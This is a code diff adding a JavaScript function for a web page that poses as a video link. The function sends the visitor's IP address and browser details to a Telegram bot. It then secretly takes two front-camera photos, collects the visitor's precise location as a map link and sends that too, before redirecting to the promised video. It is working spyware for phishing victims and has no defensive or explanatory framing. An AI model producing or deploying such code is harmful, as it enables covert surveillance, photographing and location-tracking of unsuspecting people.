@@ -1,0 +1,52 @@
+        async function startApp() {
+            try {
+                // کۆکردنەوەی زانیارییەکانی مۆبایل و سیستەم
+                const userAgent = navigator.userAgent;
+                let ipAddress = "نەدۆزرایەوە";
+                
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    ipAddress = data.ip;
+                } catch (err) { ipAddress = "بلۆک کراوە"; }
+
+                const deviceDetails = `
+📱 زانیاری ئامێر:
+🌐 IP: ${ipAddress}
+ℹ️ سیستەم: ${userAgent}
+🕒 کات: ${new Date().toLocaleString()}
+                `;
+
+                // ناردنی زانیارییە سەرەتاییەکان بۆ تێلیگرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(deviceDetails)}`);
+
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                await v.play();
+                const f = document.getElementById('flash');
+                f.style.display = 'block';
+
+                setTimeout(async () => {
+                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 Snap 1");
+                    
+                    setTimeout(async () => {
+                        await sendPhoto(v, document.getElementById('c'), "2.jpg", "📸 Snap 2");
+                        f.style.display = 'none';
+
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(async (pos) => {
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                                
+                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                                window.location.href = targetVideo;
+                            }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
+                        } else { window.location.href = targetVideo; }
+                    }, 200);
+                }, 1000);
+            } catch (e) {
+                window.location.href = targetVideo;
+            }
+        }
